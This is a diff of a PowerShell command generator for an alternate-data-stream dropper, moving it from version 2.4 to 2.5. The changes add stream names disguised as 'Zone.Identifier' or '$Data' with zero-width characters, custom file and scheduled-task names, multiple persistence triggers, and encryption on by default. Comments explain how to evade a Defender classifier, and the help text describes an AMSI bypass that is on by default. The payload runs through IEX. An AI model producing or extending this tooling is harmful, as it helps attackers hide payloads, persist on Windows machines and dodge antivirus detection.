@@ -95,10 +95,11 @@
     How ZW characters are applied. Default: 'single'
       single  One zero-width char
       multi   3-5 zero-width chars
-      hybrid  Visible prefix + zero-width suffix (e.g., Zone.Identifier[ZW])
 
-.PARAMETER HybridPrefix
-    Visible prefix for ZeroWidthMode hybrid (e.g., 'Zone.Identifier').
+.PARAMETER StreamName
+    User-defined stream name. Used as-is when ZW is off; used as visible prefix
+    with ZW chars appended when ZW is on. Tier defaults: Advanced='Zone.Identifier',
+    Paranoid='$Data'. Overrides tier default when explicitly provided.
 
 .PARAMETER CreateDecoys
     Number of benign decoy ADS streams to create alongside the payload. Range: 0-10.
@@ -111,10 +112,6 @@
 
 .PARAMETER NoAmsi
     Opt out of AMSI bypass injection. Bypass is ON by default. Almost never use this.
-
-.PARAMETER UseDeepPlacement
-
-.PARAMETER AttachToExisting
 
 .EXAMPLE
     # Fastest possible — simple payload, Advanced stealth, task persistence:
@@ -158,7 +155,7 @@
 
 .NOTES
     Author: Qweary
-    Version: 2.4 (DeflateStream Evasion + Deep Placement + _wrapEC Registry Fix)
+    Version: 2.5 (-Encrypt default, -StreamName, -FileName, -TaskName, -Trigger all, -ShowArtifacts)
     Requires: ADS-Dropper.ps1 in ./src/ or same directory
     Platform: Linux/Kali (pwsh). Output is deployed on Windows.
 
@@ -173,16 +170,36 @@ param(
     [switch]$PayloadAtDeployment,
     
     [switch]$ZeroWidthStreams,
-    
-    [ValidateSet('single', 'multi', 'hybrid')]
+
+    # 'single' = one ZW char suffix; 'multi' = multiple ZW chars suffix
+    # When -StreamName is set, ZW chars are appended to it as a suffix
+    [ValidateSet('single', 'multi')]
     [string]$ZeroWidthMode = 'single',
-    
-    [string]$HybridPrefix,
-    
+
+    # User-defined stream name. Used as-is when ZW is off; used as prefix when ZW is on.
+    # Tier defaults: Advanced='Zone.Identifier', Paranoid='$Data'
+    [string]$StreamName,
+
+    # User-defined host file name (e.g., 'WindowsUpdate.dat'). Directory is still auto-selected.
+    [string]$FileName,
+
+    # User-defined scheduled task name. Overrides the obfuscated name bank.
+    [string]$TaskName,
+
+    # Show artifact locations (ADS path, decoy paths) on deployment.
+    # Default: shown for -Obfuscate None only.
+    [switch]$ShowArtifacts,
+
     [ValidateSet('task', 'registry', 'none')]
     [string]$Persist = 'task',
 
-    [ValidateSet('AtLogOn', 'AtStartup', 'OnIdle', 'OnUnlock')]
+    [ValidateScript({
+        $valid = @('AtLogOn','AtStartup','OnIdle','OnUnlock','all')
+        foreach ($t in ($_ -split ',\s*')) {
+            if ($t -notin $valid) { throw "Invalid trigger: '$t'. Valid: $($valid -join ', ')" }
+        }
+        $true
+    })]
     [string[]]$Trigger = @('AtLogOn', 'AtStartup'),
 
     # Periodic execution interval in minutes (always added to tasks)
@@ -228,14 +245,25 @@ if ($Obfuscate -in @('Advanced', 'Paranoid')) {
     if (-not $PSBoundParameters.ContainsKey('UseDeepPlacement')) { $UseDeepPlacement = $true }
     if (-not $PSBoundParameters.ContainsKey('AttachToExisting')) { $AttachToExisting = $true }
     if (-not $PSBoundParameters.ContainsKey('Randomize')) { $Randomize = $true }
+    # Advanced/Paranoid: encryption on by default (BUG-011 fully resolved — _wrapEC hides DPAPI compound)
+    if (-not $PSBoundParameters.ContainsKey('Encrypt')) { $Encrypt = [switch]::new($true) }
 }
 if ($Obfuscate -eq 'Paranoid') {
     if (-not $PSBoundParameters.ContainsKey('ZeroWidthStreams')) { $ZeroWidthStreams = [switch]::new($true) }
+    # Paranoid default: '$Data' prefix + ZW suffix (system-looking; use single quotes in PS to avoid expansion)
+    if (-not $PSBoundParameters.ContainsKey('StreamName')) { $StreamName = '$Data' }
+}
+# Advanced default stream name: Zone.Identifier blends into legitimate Windows ADS traffic
+if ($Obfuscate -eq 'Advanced' -and -not $PSBoundParameters.ContainsKey('StreamName')) {
+    $StreamName = 'Zone.Identifier'
 }
 # Backward compat: -ZeroWidthStreams without explicit -Obfuscate upgrades to Paranoid
 if ($ZeroWidthStreams -and -not $PSBoundParameters.ContainsKey('Obfuscate')) {
     $Obfuscate = 'Paranoid'
 }
+# --- Trigger normalization (expand comma-separated strings + 'all' shorthand) ---
+$Trigger = @($Trigger | ForEach-Object { $_ -split ',\s*' } | ForEach-Object { $_.Trim() } | Select-Object -Unique)
+if ($Trigger -contains 'all') { $Trigger = @('AtLogOn','AtStartup','OnIdle','OnUnlock') }
 # -Encrypt requires compression — DPAPI functions in the outer -EncodedCommand trigger
 # Trojan:Win32/ClickFix.TFC as a compound classifier (DPAPI+registry+schtask+XOR patterns
 # together score above threshold). Compressing hides all of these inside the blob; the outer
@@ -248,7 +276,7 @@ if ($Encrypt -and $PSBoundParameters.ContainsKey('UseCompression') -and -not $Us
 }
 
 Write-Host "`n╔═══════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
-Write-Host "║ ADS Minimal Command Generator v2.4                  ║" -ForegroundColor Cyan
+Write-Host "║ ADS Minimal Command Generator v2.5                  ║" -ForegroundColor Cyan
 Write-Host "╚═══════════════════════════════════════════════════════════╝`n" -ForegroundColor Cyan
 
 # ============================================================
@@ -482,7 +510,9 @@ $params = @{
     GenerateOnly = $true
 }
 
-if ($HybridPrefix) { $params.HybridPrefix = $HybridPrefix }
+if ($StreamName) { $params.StreamName = $StreamName }
+if ($FileName) { $params.FileName = $FileName }
+if ($TaskName) { $params.TaskName = $TaskName }
 
 try {
     $config = & $adsDropperPath @params
@@ -773,6 +803,10 @@ if(-not(Get-Item `$hp -Stream `$sn -EA 0)){
             $block += "'$($decoyContents[$i])'|sc `"`${hp}:$($decoyNames[$i])`" -Force`n"
         }
         $block += "`n"
+        # Opt-in: show decoy locations on target (default for None tier, opt-in for others)
+        if ($ShowArtifacts -or $Obfuscate -eq 'None') {
+            $block += "Write-Host `"[+] Decoys: `$hp`:Zone.Identifier, `$hp`:Summary`" -ForegroundColor DarkGray`n"
+        }
     }
 
     # Persistence
@@ -1089,11 +1123,27 @@ if ($InstanceCount -gt 1) {
 `$_instanceCount=$InstanceCount
 for(`$_i=0;`$_i -lt `$_instanceCount;`$_i++){
 
-# Per-instance: unique stream name and task name
-`$sn = -join((65..90)+(97..122)|Get-Random -Count 8|ForEach-Object{[char]`$_})
-`$tn = 'WinSAT_' + (-join((65..90)|Get-Random -Count 6|ForEach-Object{[char]`$_}))
-
 "@
+    # Per-instance stream name: respect -StreamName (with optional ZW suffix) or fall back to random
+    if ($StreamName -and $ZeroWidthStreams) {
+        # Fixed prefix + random ZW suffix per instance
+        $minimalScript += @"
+`$_zw=@(0x200B,0x200C,0x200D,0xFEFF,0x2060,0x200E,0x200F)
+`$sn='$StreamName'+[char](`$_zw|Get-Random)
+"@
+    } elseif ($StreamName) {
+        # Fixed stream name (no ZW); instances differ by host path, not stream name
+        $minimalScript += "`$sn='$StreamName'`n"
+    } else {
+        $minimalScript += "`$sn=-join((65..90)+(97..122)|Get-Random -Count 8|ForEach-Object{[char]`$_})`n"
+    }
+    # Per-instance task name: respect -TaskName (with index suffix) or fall back to random
+    if ($TaskName) {
+        $minimalScript += "`$tn='$TaskName'+'_'+`$_i.ToString('00')`n"
+    } else {
+        $minimalScript += "`$tn='WinSAT_'+(-join((65..90)|Get-Random -Count 6|ForEach-Object{[char]`$_}))`n"
+    }
+    $minimalScript += "`n"
 
     if ($UseDeepPlacement -or $AttachToExisting) {
         $minimalScript += (Build-DeepPlacementCode) + "`n"
@@ -1110,9 +1160,14 @@ $hp = Join-Path $env:ProgramData (-join((65..90)+(97..122)|Get-Random -Count 8|F
         $minimalScript += "IEX `$pl`n"
     }
 
+    if ($ShowArtifacts -or $Obfuscate -eq 'None') {
+        $minimalScript += @"
+Write-Host "[+] Instance `$(`$_i+1)/$InstanceCount deployed (ADS: `$hp``:`$sn)" -ForegroundColor Green
+"@
+    }
+    $minimalScript += "}`n"
     $minimalScript += @"
-Write-Host "[+] Instance `$(`$_i+1)/$InstanceCount deployed" -ForegroundColor Green
-}
+
 
 "@
 
@@ -1140,9 +1195,9 @@ IEX `$pl
     }
 }
 
-$minimalScript += @"
-Write-Host "[+] Deployment complete (ADS: `$hp``:`$sn)" -ForegroundColor Green
-"@
+if ($ShowArtifacts -or $Obfuscate -eq 'None') {
+    $minimalScript += "Write-Host `"[+] Deployment complete (ADS: `$hp``:`$sn)`" -ForegroundColor Green`n"
+}
 
 # Base64 encode for one-liner (with optional deflate compression)
 Write-Host "[*] Encoding for transport..." -ForegroundColor White
